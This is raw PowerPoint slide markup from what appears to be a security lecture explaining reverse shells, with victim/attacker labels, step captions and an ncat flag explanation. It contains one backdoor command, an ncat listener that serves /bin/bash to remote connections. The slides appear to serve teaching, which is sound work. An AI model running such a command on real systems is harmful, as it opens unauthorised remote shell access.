              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0">
              <a:defRPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Client </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0">
              <a:defRPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/ Victim</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="Shape 197"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9800404" y="4675773"/>
            <a:ext cx="1097577" cy="674832"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="12700">
            <a:miter lim="400000"/>
          </a:ln>
          <a:extLst>
            <a:ext uri="{C572A759-6A51-4108-AA02-DFA0A04FC94B}">
              <ma14:wrappingTextBoxFlag xmlns:ma14="http://schemas.microsoft.com/office/mac/drawingml/2011/main" xmlns="" val="1"/>
            </a:ext>
          </a:extLst>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90313" tIns="90313" rIns="90313" bIns="90313" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr b="1">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Helvetica"/>
                <a:ea typeface="Helvetica"/>
                <a:cs typeface="Helvetica"/>
                <a:sym typeface="Helvetica"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0">
              <a:defRPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Server </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0">
              <a:defRPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/ Attacker </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1026" name="Picture 2" descr="Image result for attack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14445" y="1514459"/>
            <a:ext cx="990052" cy="990052"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:extLst>
            <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
              <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a14:hiddenFill>
            </a:ext>
          </a:extLst>
        </p:spPr>
      </p:pic>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="49" name="Straight Arrow Connector 48"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="1026" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="1561278" y="2009485"/>
            <a:ext cx="3353167" cy="1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774914" y="1985521"/>
            <a:ext cx="3100220" cy="1569660"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1. Let a victim </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Send</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> a signal to activate the communication channel</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="TextBox 51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7793921" y="1809876"/>
            <a:ext cx="3132976" cy="1200329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>listen </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>to a hidden communication channel</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="53" name="Straight Arrow Connector 52"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5939975" y="2009485"/>
            <a:ext cx="4112859" cy="1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AF44B25-39B4-EDD2-4140-16B3F7C3CE8A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1836292" y="4126517"/>
            <a:ext cx="7753680" cy="1369800"/>
            <a:chOff x="1836292" y="4126517"/>
            <a:chExt cx="7753680" cy="1369800"/>
          </a:xfrm>
        </p:grpSpPr>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BF9FB33B-E9EA-E8FB-D34D-41695C035B55}"/>
                    </a:ext>
                  </a:extLst>
                </p14:cNvPr>
                <p14:cNvContentPartPr/>
                <p14:nvPr/>
              </p14:nvContentPartPr>
              <p14:xfrm>
                <a:off x="1836292" y="4249637"/>
                <a:ext cx="7681680" cy="971280"/>
              </p14:xfrm>
            </p:contentPart>
          </mc:Choice>
          <mc:Fallback xmlns="">
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="3" name="Ink 2">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BF9FB33B-E9EA-E8FB-D34D-41695C035B55}"/>
                    </a:ext>
                  </a:extLst>
                </p:cNvPr>
                <p:cNvPicPr/>
                <p:nvPr/>
              </p:nvPicPr>
              <p:blipFill>
                <a:blip r:embed="rId7"/>
                <a:stretch>
                  <a:fillRect/>
                </a:stretch>
              </p:blipFill>
              <p:spPr>
                <a:xfrm>
                  <a:off x="1818292" y="4231997"/>
                  <a:ext cx="7717320" cy="10069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147A0012-B335-1771-B812-93AD13ED98B3}"/>
                    </a:ext>
                  </a:extLst>
                </p14:cNvPr>
                <p14:cNvContentPartPr/>
                <p14:nvPr/>
              </p14:nvContentPartPr>
              <p14:xfrm>
                <a:off x="9307732" y="4126517"/>
                <a:ext cx="282240" cy="327960"/>
              </p14:xfrm>
            </p:contentPart>
          </mc:Choice>
          <mc:Fallback xmlns="">
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="5" name="Ink 4">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{147A0012-B335-1771-B812-93AD13ED98B3}"/>
                    </a:ext>
                  </a:extLst>
                </p:cNvPr>
                <p:cNvPicPr/>
                <p:nvPr/>
              </p:nvPicPr>
              <p:blipFill>
                <a:blip r:embed="rId9"/>
                <a:stretch>
                  <a:fillRect/>
                </a:stretch>
              </p:blipFill>
              <p:spPr>
                <a:xfrm>
                  <a:off x="9289732" y="4108517"/>
                  <a:ext cx="31788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4579FA74-FCDA-31DA-502D-352D9E90BA49}"/>
                    </a:ext>
                  </a:extLst>
                </p14:cNvPr>
                <p14:cNvContentPartPr/>
                <p14:nvPr/>
              </p14:nvContentPartPr>
              <p14:xfrm>
                <a:off x="7619692" y="5353397"/>
                <a:ext cx="360" cy="102600"/>
              </p14:xfrm>
            </p:contentPart>
          </mc:Choice>
          <mc:Fallback xmlns="">
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="6" name="Ink 5">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4579FA74-FCDA-31DA-502D-352D9E90BA49}"/>
                    </a:ext>
                  </a:extLst>
                </p:cNvPr>
                <p:cNvPicPr/>
                <p:nvPr/>
              </p:nvPicPr>
              <p:blipFill>
                <a:blip r:embed="rId11"/>
                <a:stretch>
                  <a:fillRect/>
                </a:stretch>
              </p:blipFill>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7601692" y="5335397"/>
                  <a:ext cx="3600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Ink 6">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3F5A0F89-9C55-CFE0-5C5F-FF2FF6652324}"/>
                    </a:ext>
                  </a:extLst>
                </p14:cNvPr>
                <p14:cNvContentPartPr/>
                <p14:nvPr/>
              </p14:nvContentPartPr>
              <p14:xfrm>
                <a:off x="7494772" y="5243597"/>
                <a:ext cx="437040" cy="252720"/>
              </p14:xfrm>
            </p:contentPart>
          </mc:Choice>
          <mc:Fallback xmlns="">
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="7" name="Ink 6">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3F5A0F89-9C55-CFE0-5C5F-FF2FF6652324}"/>
                    </a:ext>
                  </a:extLst>
                </p:cNvPr>
                <p:cNvPicPr/>
                <p:nvPr/>
              </p:nvPicPr>
              <p:blipFill>
                <a:blip r:embed="rId13"/>
                <a:stretch>
                  <a:fillRect/>
                </a:stretch>
              </p:blipFill>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7476772" y="5225597"/>
                  <a:ext cx="472680" cy="288360"/>
                </a:xfrm>
                <a:prstGeom prst="rect">
                  <a:avLst/>
                </a:prstGeom>
              </p:spPr>
            </p:pic>
          </mc:Fallback>
        </mc:AlternateContent>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="11" name="Group 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{527AD5DD-B295-2283-C83A-4CCA76091787}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1685812" y="2961197"/>
            <a:ext cx="7528320" cy="735840"/>
            <a:chOff x="1685812" y="2961197"/>
            <a:chExt cx="7528320" cy="735840"/>
          </a:xfrm>
        </p:grpSpPr>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EBE43208-63F1-0F25-9853-8A3970CEA455}"/>
                    </a:ext>
                  </a:extLst>
                </p14:cNvPr>
                <p14:cNvContentPartPr/>
                <p14:nvPr/>
              </p14:nvContentPartPr>
              <p14:xfrm>
                <a:off x="1798132" y="2961197"/>
                <a:ext cx="7416000" cy="689040"/>
              </p14:xfrm>
            </p:contentPart>
          </mc:Choice>
          <mc:Fallback xmlns="">
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="9" name="Ink 8">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EBE43208-63F1-0F25-9853-8A3970CEA455}"/>
                    </a:ext>
                  </a:extLst>
                </p:cNvPr>
                <p:cNvPicPr/>
                <p:nvPr/>
              </p:nvPicPr>
              <p:blipFill>
                <a:blip r:embed="rId15"/>
                <a:stretch>
                  <a:fillRect/>
                </a:stretch>
              </p:blipFill>
              <p:spPr>
                <a:xfrm>
                  <a:off x="1780492" y="2943197"/>
                  <a:ext cx="7451640" cy="724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DA560197-D065-9045-D9BD-8A5FDAC98D00}"/>
                    </a:ext>
                  </a:extLst>
                </p14:cNvPr>
                <p14:cNvContentPartPr/>
                <p14:nvPr/>
              </p14:nvContentPartPr>
              <p14:xfrm>
                <a:off x="1685812" y="3430637"/>
                <a:ext cx="260640" cy="266400"/>
              </p14:xfrm>
            </p:contentPart>
          </mc:Choice>
          <mc:Fallback xmlns="">
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="10" name="Ink 9">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DA560197-D065-9045-D9BD-8A5FDAC98D00}"/>
                    </a:ext>
                  </a:extLst>
                </p:cNvPr>
                <p:cNvPicPr/>
                <p:nvPr/>
              </p:nvPicPr>
              <p:blipFill>
                <a:blip r:embed="rId17"/>
                <a:stretch>
                  <a:fillRect/>
                </a:stretch>
              </p:blipFill>
              <p:spPr>
                <a:xfrm>
                  <a:off x="1667812" y="3412997"/>
                  <a:ext cx="296280" cy="302040"/>
                </a:xfrm>
                <a:prstGeom prst="rect">
                  <a:avLst/>
                </a:prstGeom>
              </p:spPr>
            </p:pic>
          </mc:Fallback>
        </mc:AlternateContent>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="14" name="Group 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{334429DB-D5AE-4151-27CC-E1B608364EC4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6009412" y="2414357"/>
            <a:ext cx="439560" cy="385200"/>
            <a:chOff x="6009412" y="2414357"/>
            <a:chExt cx="439560" cy="385200"/>
          </a:xfrm>
        </p:grpSpPr>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9990DE07-2B7F-B1C6-458F-62A54B9D7768}"/>
                    </a:ext>
                  </a:extLst>
                </p14:cNvPr>
                <p14:cNvContentPartPr/>
                <p14:nvPr/>
              </p14:nvContentPartPr>
              <p14:xfrm>
                <a:off x="6118852" y="2561957"/>
                <a:ext cx="175320" cy="185040"/>
              </p14:xfrm>
            </p:contentPart>
          </mc:Choice>
          <mc:Fallback xmlns="">
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="12" name="Ink 11">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9990DE07-2B7F-B1C6-458F-62A54B9D7768}"/>
                    </a:ext>
                  </a:extLst>
                </p:cNvPr>
                <p:cNvPicPr/>
                <p:nvPr/>
              </p:nvPicPr>
              <p:blipFill>
                <a:blip r:embed="rId19"/>
                <a:stretch>
                  <a:fillRect/>
                </a:stretch>
              </p:blipFill>
              <p:spPr>
                <a:xfrm>
                  <a:off x="6101212" y="2544317"/>
                  <a:ext cx="2109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28FF1866-BB77-C985-BA9D-746090F9E9FC}"/>
                    </a:ext>
                  </a:extLst>
                </p14:cNvPr>
                <p14:cNvContentPartPr/>
                <p14:nvPr/>
              </p14:nvContentPartPr>
              <p14:xfrm>
                <a:off x="6009412" y="2414357"/>
                <a:ext cx="439560" cy="385200"/>
              </p14:xfrm>
            </p:contentPart>
          </mc:Choice>
          <mc:Fallback xmlns="">
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="13" name="Ink 12">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{28FF1866-BB77-C985-BA9D-746090F9E9FC}"/>
                    </a:ext>
                  </a:extLst>
                </p:cNvPr>
                <p:cNvPicPr/>
                <p:nvPr/>
              </p:nvPicPr>
              <p:blipFill>
                <a:blip r:embed="rId21"/>
                <a:stretch>
                  <a:fillRect/>
                </a:stretch>
              </p:blipFill>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5991412" y="2396357"/>
                  <a:ext cx="475200" cy="420840"/>
                </a:xfrm>
                <a:prstGeom prst="rect">
                  <a:avLst/>
                </a:prstGeom>
              </p:spPr>
            </p:pic>
          </mc:Fallback>
        </mc:AlternateContent>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Right Arrow 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F8730BDB-793B-1014-8282-8B952393E214}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4237964" y="5994394"/>
            <a:ext cx="2631367" cy="14911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n>
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="TextBox 16">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8CC032C4-89B7-DB99-ABC3-16D128B777F5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4835276" y="5584025"/>
            <a:ext cx="1811009" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Reverse shell</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1270554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80928" y="2045241"/>
            <a:ext cx="4166329" cy="2677656"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>-e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>: program to execute after </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400"/>
              <a:t>connection occurs., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>connecting STDIN and STDOUT to the program</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cmd.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>: a shell command for Windows</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 1"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6985048" y="5692495"/>
            <a:ext cx="4675064" cy="376966"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="36363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95220" rIns="0" bIns="95220" numCol="1" anchor="ctr" anchorCtr="0" compatLnSpc="1">
            <a:prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr defTabSz="1219170" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS" panose="020B0604020202020204" pitchFamily="34" charset="-128"/>
                <a:ea typeface="Monaco"/>
              </a:rPr>
              <a:t>ncat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS" panose="020B0604020202020204" pitchFamily="34" charset="-128"/>
                <a:ea typeface="Monaco"/>
              </a:rPr>
              <a:t> -l 10000 -e /bin/bash    //if create a backdoor in Linux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="TextBox 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6880928" y="340707"/>
            <a:ext cx="2669320" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Victim sends signals</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="6" name="Straight Arrow Connector 5"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="2" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="9131675" y="571540"/>
            <a:ext cx="418573" cy="39912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pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6985048" y="977022"/>
            <a:ext cx="3958088" cy="936221"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Picture 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{34B348BD-A2F6-402E-B0EF-FD6D02594ACF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="75456" y="0"/>
            <a:ext cx="5244883" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="TextBox 14">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{05A84F03-3BE5-4BFF-9DA4-E19E32FD84AE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3229658" y="977022"/>
            <a:ext cx="2024732" cy="543867"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1467" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Attacker listens port 8080 first</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="13" name="Group 12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5E0BAF26-E70C-32CD-85C5-348CA092D882}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="2202412" y="69317"/>
            <a:ext cx="322920" cy="321480"/>
            <a:chOff x="2202412" y="69317"/>
            <a:chExt cx="322920" cy="32148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A806AB91-F5ED-D09C-5416-1C1790B0E281}"/>
                    </a:ext>
                  </a:extLst>
                </p14:cNvPr>
                <p14:cNvContentPartPr/>
                <p14:nvPr/>
              </p14:nvContentPartPr>
              <p14:xfrm>
                <a:off x="2344252" y="210437"/>
                <a:ext cx="23760" cy="155880"/>
              </p14:xfrm>
            </p:contentPart>
          </mc:Choice>
          <mc:Fallback xmlns="">
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="3" name="Ink 2">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A806AB91-F5ED-D09C-5416-1C1790B0E281}"/>
                    </a:ext>
                  </a:extLst>
                </p:cNvPr>
                <p:cNvPicPr/>
                <p:nvPr/>
              </p:nvPicPr>
              <p:blipFill>
                <a:blip r:embed="rId5"/>
                <a:stretch>
                  <a:fillRect/>
                </a:stretch>
              </p:blipFill>
